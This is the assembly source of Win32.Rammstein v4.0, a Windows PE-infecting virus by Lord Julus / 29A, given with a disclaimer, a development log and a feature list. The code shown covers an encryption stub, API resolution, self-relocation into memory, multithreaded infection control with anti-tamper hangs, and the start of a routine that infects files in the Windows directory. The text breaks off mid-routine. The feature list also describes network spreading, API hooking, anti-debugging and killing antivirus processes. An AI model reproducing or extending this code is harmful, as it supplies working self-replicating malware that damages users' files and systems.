comment $
                         €€€€€€€€€€€€€€€€€€€€€€€€€€€
                         €€ﬂ     ﬂ€ﬂ     ﬂ€ﬂ     ﬂ€€
                         €€   €   €   €   €   €   €€
                         €€€ﬂﬂﬂ  ‹€‹      €       €€
                         €€   ﬂﬂﬂﬂ€ﬂﬂﬂﬂ   €   €   €€
                         €€       €      ‹€   €   €€
                         €€€€€€€€€€€€€€€€€€€€€€€€€€€

     ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹       ‹‹‹‹‹‹‹ ‹‹‹‹‹ ‹‹‹ ‹‹‹
     € ‹‹‹ € € ‹‹‹ € € ‹ ‹ € € ‹ ‹ € € ‹‹‹‹€ ‹€ﬂ€‹ € ‹‹‹‹€ €‹ ‹€ € ﬂ€€ €
     € ‹ ‹‹€ € ‹‹‹ € € € € € € € € € €‹‹‹‹ € €‹ ‹€ € ‹‹‹€‹ ‹€ €‹ € €‹ﬂ €
     €‹€‹‹‹€ €‹€ €‹€ €‹€ﬂ€‹€ €‹€ﬂ€‹€ €‹‹‹‹‹€  ﬂﬂﬂ  €‹‹‹‹‹€ €‹‹‹€ €‹€ﬂ€‹€

                                     v4.0

                              = Final Release =

                       (c) Lord Julus / 29A (Nov 2000)


     ===================================================================

                                DISCLAIMER

     This is the source code of a virus. Possesing, using, spreading of
     this source code, compiling and linking it, possesing, using and
     spreading of the executable form is illegal and it is forbidden.
     Should you do such a thing, the author may not be held responsible
     for any damage that occured from the use of this source code. The
     actual purpose of this source code is for educational purposes and
     as an object of study. This source code comes as is and the author
     cannot be held responsible for the existance of other modified
     variants of this code.

     ====================================================================

     History:

     09 Sep 2000 - Today I made a small improvement. When the dropper roams
                   the net onto another computer it remains in the windows
                   dir and it represents a weak point which might be noticed
                   by an av. So, now, the virus will smartly remove either
                   the dropper or the entry in the win.ini file if one of
                   them is missing. If both are there, they are left alone
                   because they will remove eachother. Added Pstores.exe to
                   the black list. Thanks to Evul for pointing me out that
                   it is a rather peculiar file and cannot be safely
                   infected.

     22 Jul 2000 - The virus has moved up to version 4.0. Today I added
                   the network infector. It comes in a separate thread.
                   For the moment looks like everything works fine. Will
                   add a timer to it so that it does not hang in huge
                   networks... Virus is above 13k now... Waiting for the
                   LZ!

     18 Jul 2000 - Fixed a bug in the section increase algorithm: if you
                   want to have a good compatibility you NEED to place the
                   viral code exactly at the end of file and NOT at the
                   end of the VirtualSize or SizeOfRawData as it appears
                   in the section header, because many files get their
                   real size calculated at load time in some way.
                   HURRAY!!! YES!! I fixed a shitty bug! If you do section
                   add you MUST check also if any directory VA follows
                   immediately the last section header so that you will
                   not overwrite it. Now almost all files work ok under
                   NT!!!! However, I don't seem to be able to make
                   outlook.exe get infected so I put it on the black list.
                   The other MsOffice executables get infected correctly
                   on both Win9x and WinNT.

     17 Jul 2000 - Have started some optimizations and proceduralizations
                   (;-)))). The virus is quickly going towards 13k so I
                   am quite anxious to implement my new LZ routine to
                   decrease it's size. I fixed a bug: WinNT NEEDS the
                   size of headers value to be aligned to file alignment.

     14 Jul 2000 - Worked heavily on the WindowsNT compatibility. In this
                   way I was able to spot 2 bugs in the infection routine,
                   one regarding RVA of the new section and one regarding
                   the situation when the imports cannot be found by the api
                   hooker. Still thinking if I should rearrange relocs also?
                   Now files are loaded under WindowsNT (NT image is correct)
                   but they cannot fully initialize. Will research some
                   more.

     03 Jun 2000 - Added an encryption layer with no key, just a rol/ror
                   routine on parity. Also added some MMX commands. Fixed
                   a few things.

     22 May 2000 - Added EPO on files that have the viral code outside the
                   code section. Basically from now on the entry point stays
                   only into the code section. The epo is not actually epo,
                   because as I started to code it I decided to make it very
                   complicated so I will include the complicated part in the
                   next release. It will be the so called LJILE32 <Lord
                   Julus' Instruction Length Engine 32>. This engine will
                   allow me to have an exact location of the opcode for each
                   instruction so we will be able to look up any call, jump
                   or conditional jump to place our code call there. So for
                   this version only a jump at the original eip.

     21 May 2000 - Fixed a bug in the api hooker... I forgot that some import
                   sections have a null pointer to names. Also added the
                   infection by last section increase for files who cannot
                   be infected otherwise. All files should be touched now.
                   Also I fixed the problem with the payload window not
                   closing after the process closed. I solved half of it
                   as some files like wordpad.exe still have this problem.

     20 May 2000 - Prizzy helped me a lot by pointing out to me that in
                   order to have the copro working ok I need to save it's
                   environment so that the data of the victim process in
                   not altered. thanx!! Also fixed the cpuid read.

     14 May 2000 - Released first beta version to be tested

     ====================================================================
     Virus Name ........... Win32.Rammstein
     Virus Version ........ 4.0
     Virus Size ........... 14002 (debug), 15176 (release)
     Virus Author ......... Lord Julus / 29A
     Release Date ......... 30 Nov 2000
     Virus type ........... PE infector
     Target OS ............ Win95, Win98, WinNT, Win2000
     Target Files ......... many PE file types:
                            EXE COM ACM CPL HDI OCX PCI
                            QTC SCR X32 CNV FMT OCM OLB WPC
     Append Method ........ The  virus will check wether there is enough room
                            for  it  inside the code section. If there is not
                            enough  room  the virus will be placed at end. If
                            there  is  it  will  be  inserted inside the code
                            section  at  a  random  offset while the original
                            code will be saved at end. The placing at the end
                            has  also  two  variants.  If the last section is
                            Resources  or Relocations the virus will insert a
                            new section before the last section and place the
                            data  there,  also rearranging the last section's
                            RVAs.  If  the  last section is another section a
                            new  section  will  be placed at end. The name of
                            the new section is a common section name which is
                            choosed  based  on  the existing names so that it
                            does  not  repeat.  If the virus is placed at the
                            end just a small EPO code is used so that the eip
                            stays inside the code section.
                            A  special situation occurs if there is no enough
                            space  to  add  a new section header, for example
                            when  the  code section starts at RVA 200 (end of
                            headers).   In  this  situation  the  virus  will
                            increase the last section in order to append.
     Infect Methods ....... -Direct  file  attacks:  the  virus  will  attack
                            specific  files  in  the windows directory, files
                            which are most used by people
                            -Directory   scan:   all  files  in  the  current
                            directory will be infected, as well as 3 files in
                            the   system  directory  and  3  in  the  windows
                            directory
                            -Api  hooking  (per-process residency): the virus
                            hooks  a  few  api calls and infects files as the
                            victim  uses  the  apis
                            -Intranet  spreading:  the virus spreads into the
                            LAN using only windows apis
     Features ............. Multiple  threads:  the  virus  launches  a  main
                            thread.  While  this thread executes, in the same
                            time,  the original thread returns to host, so no
                            slowing  down  appears.  The  main  viral  thread
                            launches  other  6  threads  and  monitors  their
                            execution.  If  one of the threads is not able to
                            finish  the  system  is  hanged  because it means
                            somebody tryied to patch some of the thread code.
                            Heavy  anti-debugging:  i tried to use almost all
                            the  anti-debug  and  anti-emulation stuff that I
                            know
                            FPU: uses fpu instructions
                            Crc32 search: uses crc32 to avoid waste of space
                            Memory  roaming:  allocates  virtual  memory  and
                            jumps in it
                            Interlaced  code:  this  means  that some threads
                            share  the  same  piece  of code and the virus is
                            careful   to  let  only  one  in  the  same  time
                            otherwise we get some of the variables distroyed.
                            Preety hard to be emulated by avs.
                            Also features semaphores, timers
                            Marks infection using the Pythagoreic numbers.
                            SEH: the virus creates 9 SEH handlers, for each
                            thread and for the main thread.
(*)  Polymorphic .......... Yes (2 engines: Modularis, LJFPE32)
(*)  Metamorphic .......... Yes (mild custom metamorphic engine)
     Encrypted ............ Yes
     Safety ............... Yes (avoids infecting many files)
     Kill AV Processes .... Yes
     Payload .............. On  14th  every  even  month the infected process
                            will  launch  a  thread  that will display random
                            windows  with  some  of  the  Rammstein's lyrics.
                            Pretty  annoying...  Probably  this  is the first
                            virus  that  actually  creates  real  windows and
                            processes  their  messages. The windows shut down
                            as the victim process closes.


     (*) Feature not included in this version.

     Debug notes: please note that this source code features many ways of
     debugging. You may turn on and off most of the virus's features by
     turning some variables to TRUE or FALSE.
     ====================================================================

        $

;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
.586p                                              ;
.model flat, stdcall                               ;
                                                   ;
extrn MessageBoxA:proc                             ;
extrn ExitProcess: proc                            ;
                                                   ;
TRUE                  =       1                    ;
FALSE                 =       0                    ;
DEBUG                 =       TRUE                 ;debug on?
ANTIEMU               =       TRUE                 ;anti-debuggin/emulation?
JUMP                  =       TRUE                 ;allocate and jump in mem?
DIRECT                =       TRUE                 ;direct action?
ANTIAV                =       TRUE                 ;anti-av feature?
APIHOOK               =       TRUE                 ;hook imported apis?
MAINTHREAD            =       TRUE                 ;launch a main thread?
PAYLOAD               =       TRUE                 ;use payload?
RANDOMIZE_ENTRY       =       TRUE                 ;randomize code sec entry?
EPO                   =       TRUE                 ;Use EPO
MMX                   =       FALSE                ;
NETWORKINFECTION      =       TRUE                 ;
VIRUSNOTIFYENTRY      =       FALSE                ;msgbox at virus start?
VIRUSNOTIFYEXIT       =       FALSE                ;msgbox at virus end?
VIRUSNOTIFYHOOK       =       FALSE                ;
MAINTHREADSEH         =       TRUE                 ;
THREAD1SEH            =       TRUE                 ;
THREAD2SEH            =       TRUE                 ;
THREAD3SEH            =       TRUE                 ;
THREAD4SEH            =       FALSE                ;
THREAD5SEH            =       FALSE                ;
THREAD6SEH            =       TRUE                 ;
CHECKSUM              =       TRUE                 ;
WE_ARE_LAST           =       0                    ;
RELOCATIONS_LAST      =       1                    ;
RESOURCES_LAST        =       2                    ;
NOT_AVAILABLE         =       0                    ;
AVAILABLE             =       1                    ;
METHOD_MOVE_CODE      =       0                    ;
METHOD_APPEND_AT_END  =       1                    ;
METHOD_INCREASE_LAST  =       2                    ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
                                                   ;
IF MMX                                             ;
include mmx.inc                                    ; MMX !
ENDIF                                              ;
                                                   ;
@endsz macro                                       ;locate end of asciiz
       local nextchar                              ;string
                                                   ;
nextchar:                                          ;
       lodsb                                       ;
       test al, al                                 ;
       jnz nextchar                                ;
       endm                                        ;
                                                   ;
include w32nt_lj.inc                               ;
include w32us_lj.inc                               ;
                                                   ;
; Credits to jp, vecna, prizzy                     ;calculate crc32
mCRC32        equ     0C1A7F39Ah                   ;
mCRC32_init   equ     09C3B248Eh                   ;
crc32   macro   string                             ;
            crcReg = mCRC32_init                   ;
            irpc    _x,<string>                    ;
                ctrlByte = '&_x&' xor (crcReg and 0FFh)
                crcReg = crcReg shr 8              ;
                rept 8                             ;
                    ctrlByte = (ctrlByte shr 1) xor (mCRC32 * (ctrlByte and 1))
                endm                               ;
                crcReg = crcReg xor ctrlByte       ;
            endm                                   ;
            dd  crcReg                             ;
endm                                               ;
                                                   ;
noter macro string                                 ;this NOTs a string
      irpc _x,<string>                             ;
      notbyte = not('&_x&')                        ;
      db notbyte                                   ;
      endm                                         ;
      db not(0)                                    ;
endm                                               ;
                                                   ;
PUSH_POP STRUCT                                    ;
         pop_edi dd ?                              ;helps us to pop stuff...
         pop_esi dd ?                              ;
         pop_ebp dd ?                              ;
         pop_esp dd ?                              ;
         pop_ebx dd ?                              ;
         pop_edx dd ?                              ;
         pop_ecx dd ?                              ;
         pop_eax dd ?                              ;
PUSH_POP ENDS                                      ;
                                                   ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
                                                   ;
.data                                              ;
db 0                                               ;
                                                   ;
.code                                              ;
                                                   ;
start:                                             ;
       IF DEBUG                                    ;
       jmp xxx                                     ;
debug_start db 'Here is the start of the virus.',0 ;Really!! ;-)
xxx:                                               ;
       ENDIF                                       ;
       pushad                                      ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
       call getdelta                               ; Get the delta handle
                                                   ;
getdelta:                                          ;
       pop ebp                                     ;
       sub ebp, offset getdelta                    ;
       or ebp, ebp                                 ;check if first gen
       jnz no_first                                ;
       mov [ebp+firstgen], 1                       ;mark the first generation
       jmp get_base                                ;
                                                   ;
no_first:                                          ;
       mov [ebp+firstgen], 0                       ;
                                                   ;
get_base:                                          ;
       call getimagebase                           ; And the imagebase...
                                                   ;
getimagebase:                                      ;
       pop eax                                     ;
                                                   ;
ourpoint:                                          ;
       sub eax, 1000h+(ourpoint-start)-1           ;before this eax equals
                                                   ;imagebase+RVA(ourpoint)+
                                                   ;RVA(code section)
                                                   ;
       mov dword ptr [ebp+imagebase], eax          ;
       mov dword ptr [ebp+ourimagebase], eax       ;
       jmp over_data                               ;
                                                   ;
imagebase    dd 00400000h                          ;
ourimagebase dd 0                                  ;
firstgen     dd 0                                  ;
                                                   ;
over_data:                                         ;
       cmp [ebp+firstgen], 1                       ;
       je EncryptedArea                            ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
       call DecryptOffset                          ;very light internal
                                                   ;decrypt module
DecryptOffset:                                     ;no key, just ror/rol
       pop esi                                     ;
       add esi, (EncryptedArea - DecryptOffset)    ;
       mov edi, esi                                ;
       mov ecx, (end2-EncryptedArea)               ;
                                                   ;
DecryptLoop:                                       ;
       lodsb                                       ;
       mov ebx, ecx                                ;
       inc bl                                      ;
       jp parity                                   ;
       ror al, cl                                  ;
       jmp do_decrypt                              ;
                                                   ;
parity:                                            ;
       rol al, cl                                  ;
                                                   ;
do_decrypt:                                        ;
       stosb                                       ;
       loop DecryptLoop                            ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
EncryptedArea:                                     ;
       mov [ebp+delta], ebp                        ;save additional deltas
       IF ANTIEMU                                  ;
       mov [ebp+delta2], ebp                       ;
       ENDIF                                       ;
       mov eax, [ebp+imagebase]                    ;
       mov dword ptr [ebp+adjust], eax             ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
       lea eax, [ebp+ExceptionExit]                ; Setup a SEH frame
       push eax                                    ;
       push dword ptr fs:[0]                       ;
       mov fs:[0], esp                             ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
       mov [ebp+copying], 0                        ;reset our syncronization
       mov [ebp+in_list], 0                        ;variables
       mov [ebp+free_routine], AVAILABLE           ;
       mov [ebp+crt_dir_flag], 3                   ;
       mov [ebp+apihookfinish], 0                  ;
                                                   ;
       lea esi, [ebp+module_names]                 ;decrypt module names
       mov ecx, module_names_length                ;
       call not_list                               ;
                                                   ;
       mov eax, [esp+28h]                          ;first let's locate the
       lea edx, [ebp+kernel32_name]                ;kernel32 base address
       call LocateKernel32                         ;
       jc ReturnToHost                             ;
       mov dword ptr [ebp+k32], eax                ;
       lea esi, dword ptr [ebp+kernel32apis]       ;
       lea edx, dword ptr [ebp+kernel32addr]       ;
       mov ecx, kernel32func                       ;
       call LocateApis                             ;and kernel32 apis
       jc ReturnToHost                             ;
                                                   ;
       lea edi, dword ptr [ebp+advapi32_name]      ;locate advapi32
       call LocateModuleBase                       ;
       jc ReturnToHost                             ;
       mov dword ptr [ebp+a32], eax                ;
       lea esi, dword ptr [ebp+advapi32apis]       ;
       lea edx, dword ptr [ebp+advapi32addr]       ;
       mov ecx, advapi32func                       ;
       call LocateApis                             ;and the apis
       jc ReturnToHost                             ;
                                                   ;
       lea edi, dword ptr [ebp+user32_name]        ;locate user32
       call LocateModuleBase                       ;
       jc ReturnToHost                             ;
       mov dword ptr [ebp+u32], eax                ;
       lea esi, dword ptr [ebp+user32apis]         ;
       lea edx, dword ptr [ebp+user32addr]         ;
       mov ecx, user32func                         ;
       call LocateApis                             ;and it's apis
       jc ReturnToHost                             ;
                                                   ;
       lea edi, dword ptr [ebp+gdi32_name]         ;locate gdi32
       call LocateModuleBase                       ;
       jc ReturnToHost                             ;
       mov dword ptr [ebp+g32], eax                ;
       lea esi, dword ptr [ebp+gdi32apis]          ;
       lea edx, dword ptr [ebp+gdi32addr]          ;
       mov ecx, gdi32func                          ;
       call LocateApis                             ;and it's apis
       jc ReturnToHost                             ;
                                                   ;
       lea edi, dword ptr [ebp+mpr32_name]         ;locate mpr32
       call LocateModuleBase                       ;
       jc NoNetworkApis                            ;
       mov dword ptr [ebp+m32], eax                ;
       lea esi, dword ptr [ebp+mpr32apis]          ;
       lea edx, dword ptr [ebp+mpr32addr]          ;
       mov ecx, mpr32func                          ;
       call LocateApis                             ;and it's apis
       jc NoNetworkApis                            ;
                                                   ;
       mov [ebp+netapis], TRUE                     ;
       jmp get_img                                 ;
                                                   ;
NoNetworkApis:                                     ;
       mov [ebp+netapis], FALSE                    ;
                                                   ;
get_img:                                           ;
       lea edi, dword ptr [ebp+img32_name]         ;locate and save
       call LocateModuleBase                       ;the checksum procedure
       jc no_image                                 ;
       call @checksum                              ;
       db "CheckSumMappedFile", 0                  ;
@checksum:                                         ;
       push eax                                    ;
       call [ebp+_GetProcAddress]                  ;
       mov [ebp+checksumfile], eax                 ;
                                                   ;
no_image:                                          ;
       lea esi, [ebp+module_names]                 ;recrypt names
       mov ecx, module_names_length                ;
       call not_list                               ;
                                                   ;
       IF VIRUSNOTIFYENTRY                         ;
       push 0                                      ;
       call entrytext1                             ;
       db 'Rammstein viral code start!', 0         ;
entrytext1:                                        ;
       call entrytext2                             ;
       db 'Rammstein viral code start!', 0         ;
entrytext2:                                        ;
       push 0                                      ;
       call [ebp+_MessageBoxA]                     ;
       ENDIF                                       ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
       call smash_dropper                          ;kill dropper
       call getversion                             ;get the windoze version
                                                   ;
WindowsVersion OSVERSIONINFOA <SIZE OSVERSIONINFOA>;
                                                   ;
getversion:                                        ;
       call [ebp+_GetVersionExA]                   ;
       mov byte ptr [ebp+version], al              ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
       mov [ebp+skipper], 0                        ;
       IF MMX                                      ;
       pushfd                                      ;push flags
       pop eax                                     ;get flags
       bt eax, 21h                                 ;test for mmx presence
       jnc no_mmx_present                          ;
       mov [ebp+mmx], TRUE                         ;set it!
       jmp done_mmx                                ;
                                                   ;
no_mmx_present:                                    ;
       mov [ebp+mmx], FALSE                        ;
                                                   ;
done_mmx:                                          ;
       ENDIF                                       ;
       IF JUMP                                     ;allocate some more
                                                   ;
       cmp [ebp+method], METHOD_MOVE_CODE          ;if code is not moved
       jne restore_epo                             ;skip memory jump
                                                   ;
       call [ebp+_VirtualAlloc], 0, virussize+1000h, MEM_COMMIT+MEM_RESERVE,\
                                 PAGE_EXECUTE_READWRITE
       or eax, eax                                 ;memory
       jnz no_memory_error                         ;
                                                   ;
       call fatalexit                              ;we cannot continue...
       db "Not enough memory!", 0                  ;
                                                   ;
fatalexit:                                         ;if an error occurs, then
       push 0                                      ;simulate a fatal exit
       call [ebp+_FatalAppExitA]                   ;
                                                   ;
no_memory_error:                                   ;
       mov [ebp+memory], eax                       ;otherwise copy the
       lea esi, [ebp+start]                        ;virus to memory and
       mov edi, eax                                ;
       mov ecx, virussize                          ;
       rep movsb                                   ;
       add eax, offset resident_area - offset start;
       push eax                                    ;
       ret                                         ;continue there...
                                                   ;
restore_epo:                                       ;
       IF EPO                                      ;
       mov edi, [ebp+addressofentrypoint]          ;restore epo
       add edi, [ebp+imagebase]                    ;
       lea esi, [ebp+saved_code]                   ;
       lodsd                                       ;
       stosd                                       ;
       lodsd                                       ;
       stosd                                       ;
       ENDIF                                       ;
                                                   ;
resident_area:                                     ;
       call getdelta2                              ;get delta again...
                                                   ;
getdelta2:                                         ;
       pop ebp                                     ;
       sub ebp, offset getdelta2                   ;
       mov [ebp+delta], ebp                        ;
       IF ANTIEMU                                  ;
       mov [ebp+delta2], ebp                       ;
       ENDIF                                       ;
                                                   ;
       cmp [ebp+firstgen], 1                       ;
       je grunge                                   ;
                                                   ;
       cmp [ebp+method], METHOD_MOVE_CODE          ;check the method
       jne second_method                           ;
                                                   ;
       mov esi, [ebp+codesource]                   ;if here, we must move
       mov edi, [ebp+codedestin]                   ;some code back to where
       add esi, [ebp+imagebase]                    ;it belongs...
       add edi, [ebp+imagebase]                    ;
       mov ecx, virussize                          ;
       rep movsb                                   ;
                                                   ;
second_method:                                     ;
                                                   ;
grunge:                                            ;
       ENDIF                                       ;
       IF MAINTHREAD                               ;now we launch the main
       lea ebx, [ebp+mainthreadid]                 ;thread
       lea eax, [ebp+MainThread]                   ;
       call [ebp+_CreateThread], 0, 0, eax, ebp, 0, ebx;
       cmp [ebp+firstgen], 1                       ;if it is the first gen
       jne do_return                               ;than wait for it to
       call [ebp+_WaitForSingleObject], eax, INFINITE ;finish
                                                   ;
do_return:                                         ;otherwise, return to host
       jmp ReturnToHost                            ;here...
       ENDIF                                       ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
MainThread proc                                    ;
       call @MainThreadDelta                       ;for our main thread get
@MainThreadDelta:                                  ;the delta handle again
       pop ebp                                     ;
       sub ebp, offset @MainThreadDelta            ;
                                                   ;
       IF MAINTHREADSEH                            ;
       lea eax, [ebp+MainExceptionExit]            ; Setup a SEH frame
       push eax                                    ;
       push dword ptr fs:[0]                       ;
       mov fs:[0], esp                             ;
                                                   ;
no_main_seh:                                       ;
       ENDIF                                       ;
       lea edx, [ebp+OurThreads]                   ;Prepare to create the
       lea ebx, [ebp+OurThreadIds]                 ;threads...
       lea edi, [ebp+OurThreadHandles]             ;
       mov ecx, 6                                  ;
                                                   ;
create_loop:                                       ;
       mov eax, [edx]                              ;
       add eax, ebp                                ;
       call StartThread                            ;start them and set
       add edx, 4                                  ;them
       add ebx, 4                                  ;
       add edi, 4                                  ;
       loop create_loop                            ;
                                                   ;
       cmp [ebp+no_imports], TRUE                  ;
       jne no_per_process_skip                     ;
       mov [ebp+skipper], 1                        ;
                                                   ;
no_per_process_skip:                               ;
       lea eax, [ebp+offset Semaphore]             ;now prepare a semaphore
       push eax                                    ;to monitor their
       push 31                                     ;execution
       push 0                                      ;
       push 0                                      ;
       call [ebp+_CreateSemaphoreA]                ;
       mov [ebp+hsemaphore], eax                   ;
                                                   ;
       lea edi, [ebp+OurThreadHandles]             ;and now start them...
       mov ecx, 6                                  ;
                                                   ;
resume_loop:                                       ;
       push ecx                                    ;
       push dword ptr [edi]                        ;
       call [ebp+_ResumeThread]                    ;resume!
       add edi, 4                                  ;
       pop ecx                                     ;
       loop resume_loop                            ;
                                                   ;
       push FALSE                                  ;Wait forever until all
       push INFINITE                               ;threads finish...
       push TRUE                                   ;(if the mainthread is
       lea eax, [ebp+offset OurThreadHandles]      ;TRUE, by this time the
       push eax                                    ;host is already running
       push 6                                      ;in parallel with this
       call [ebp+_WaitForMultipleObjectsEx]        ;thread)
                                                   ;
       lea eax, [ebp+test_semaphore]               ;now get the last count
       push eax                                    ;of the semaphore...
       push 1                                      ;Should be 6*5...
       push [ebp+hsemaphore]                       ;
       call [ebp+_ReleaseSemaphore]                ;
                                                   ;
       push [ebp+hsemaphore]                       ;close semaphore
       call [ebp+_CloseHandle]                     ;
                                                   ;
       mov eax, [ebp+test_semaphore]               ;now get the value
       mov ebx, offset where_to - offset jump      ;calculate jump offset
       sub ebx, 30                                 ;5*6
       add eax, ebx                                ;and make a jump with it
       add eax, offset jump                        ;If the value is smaller
       add eax, ebp                                ;
jump:  jmp eax                                     ;then it should
       jmp jump                                    ;mean someone fucked with
       jmp jump                                    ;our threads and probably
       jmp jump                                    ;the execution falls here
       jmp jump                                    ;where it hangs... This
       jmp jump                                    ;will give the user the
       jmp jump                                    ;impression that he played
       jmp jump                                    ;with hot stuff...
                                                   ;
where_to:                                          ;
       IF MAINTHREAD                               ;if we have a mainthread
       db 0E9h                                     ;we must kill it...
       dd offset KillThread - $-4                  ;
       ELSE                                        ;
       db 0E9h                                     ;otherwise, simply return
       dd offset ReturnToHost - $-4                ;to host...
       ENDIF                                       ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
StartThread:                                       ;
       pusha                                       ;here we create threads
       call [ebp+_CreateThread], 0, 0, eax, ebp, CREATE_SUSPENDED, ebx
       mov [edi], eax                              ;
       push THREAD_PRIORITY_HIGHEST                ;and set their priority
       push dword ptr [ebx]                        ;
       call [ebp+_SetThreadPriority]               ;
       popa                                        ;
       db 0c3h                                     ;ret
       ret                                         ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
OurThreadIds:                                      ;
Thread_1_id dd 0                                   ;Direct infector
Thread_2_id dd 0                                   ;Directory infector
Thread_3_id dd 0                                   ;AV killed
Thread_4_id dd 0                                   ;Anti-debugging
Thread_5_id dd 0                                   ;Api hooker
Thread_6_id dd 0                                   ;Network infector
                                                   ;
OurThreadHandles:                                  ;
Thread_1_handle dd 0                               ;
Thread_2_handle dd 0                               ;
Thread_3_handle dd 0                               ;
Thread_4_handle dd 0                               ;
Thread_5_handle dd 0                               ;
Thread_6_handle dd 0                               ;
hsemaphore      dd 0                               ;
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
;€ This Thread is the direct infector thread
;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
Thread_1_StartAddress proc PASCAL tdelta: dword    ;
       call @Thread1Delta                          ;I have been experiencing
@Thread1Delta:                                     ;problems with delta pass
       pop ebp                                     ;via the parameter so I
       sub ebp, offset @Thread1Delta               ;decided to read it again
                                                   ;
       IF THREAD1SEH                               ;
       lea eax, [ebp+Thread1Exception]             ; Setup a SEH frame
       push eax                                    ;
       push dword ptr fs:[0]                       ;
       mov fs:[0], esp                             ;
       ENDIF                                       ;
                                                   ;
       IF DIRECT                                   ;
       lea esi, [ebp+offset direct_list]           ;point file names in the
       mov ecx, direct_list_len                    ;Windows directory and
       call not_list                               ;restore names...
                                                   ;
       push 260d                                   ;
       call windir                                 ;get the Windows dir.
name_  db 260d dup (0)                             ;
                                                   ;
windir:                                            ;
       call [ebp+_GetWindowsDirectoryA]            ;
       lea edi, [ebp+name_]                        ;point the dir path
       xchg eax, edx                               ;
       lea esi, [ebp+direct_list]                  ;point names
       inc esi                                     ;
       inc esi                                     ;
                                                   ;
direct_loop:                                       ;
       mov word ptr [edi+edx], 005Ch               ;mark terminator slash
       cmp byte ptr [esi], 0FFh                    ;was last name?
       je direct_end                               ;
       call [ebp+_lstrcat], edi, esi               ;concatenate stringz
       lea eax, [ebp+W32FD]                        ;pointer to find data
       call [ebp+_FindFirstFileA], edi, eax        ;find file
       cmp eax, INVALID_HANDLE_VALUE               ;none?
       je next_direct                              ;
                                                   ;
       push edi                                    ;
       lea edi, [edi.WFD_cFileName]                ;
@001:  cmp [ebp+free_routine], NOT_AVAILABLE       ;
       je @001                                     ;
